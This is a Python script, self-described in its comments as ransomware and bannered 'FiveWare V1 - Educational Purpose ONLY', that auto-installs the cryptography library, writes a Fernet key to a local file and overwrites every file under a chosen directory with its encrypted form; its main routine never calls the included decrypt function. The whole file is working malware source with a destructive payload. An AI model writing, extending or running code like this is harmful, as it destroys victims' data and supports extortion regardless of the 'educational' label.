import os
import subprocess
import sys

# Auto install required module
def install_module(module_name):
    subprocess.check_call([sys.executable, "-m", "pip3", "install", module_name])

# Install cryptography module if not already installed
try:
    from cryptography.fernet import Fernet
except ImportError:
    install_module("cryptography")
    from cryptography.fernet import Fernet

# Generate a key for encryption
def generate_key():
    key = Fernet.generate_key()
    with open("keys.five", "wb") as key_file:
        key_file.write(key)

# Load the encryption key
def load_key():
    return open("keys.five", "rb").read()

# Encrypt files in the specified directory
def encrypt_files(directory):
    key = load_key()
    fernet = Fernet(key)
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as file_data:
                data = file_data.read()
            encrypted_data = fernet.encrypt(data)
            with open(file_path, "wb") as file_data:
                file_data.write(encrypted_data)

# Decrypt files in the specified directory
def decrypt_files(directory):
    key = load_key()
    fernet = Fernet(key)
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as file_data:
                data = file_data.read()
            decrypted_data = fernet.decrypt(data)
            with open(file_path, "wb") as file_data:
                file_data.write(decrypted_data)

# Main function to run the ransomware
def main():
    os.system(f'p')
    os.system('clear')
    print("███████╗██╗██╗   ██╗███████╗██╗    ██╗ █████╗ ██████╗ ███████╗")
    print("██╔════╝██║██║   ██║██╔════╝██║    ██║██╔══██╗██╔══██╗██╔════╝")
    print("█████╗  ██║██║   ██║█████╗  ██║ █╗ ██║███████║██████╔╝█████╗") 
    print("██╔══╝  ██║╚██╗ ██╔╝██╔══╝  ██║███╗██║██╔══██║██╔══██╗██╔══╝")  
    print("██║     ██║ ╚████╔╝ ███████╗╚███╔███╔╝██║  ██║██║  ██║███████╗")
    print("╚═╝     ╚═╝  ╚═══╝  ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝")
    print("\033[91mFiveWare V1 - Educational Purpose ONLY\033[0m")
    print("\033[92mUnder Development @505Lab | t.me/Lab505 ~ Author @505Snoop\033[0m")
    print(" ")
    directory = input("Enter the directory to encrypt: ")
    generate_key()
    encrypt_files(directory)
    print("Files have been encrypted. Keep the encryption key safe.")

if __name__ == "__main__":
    main()
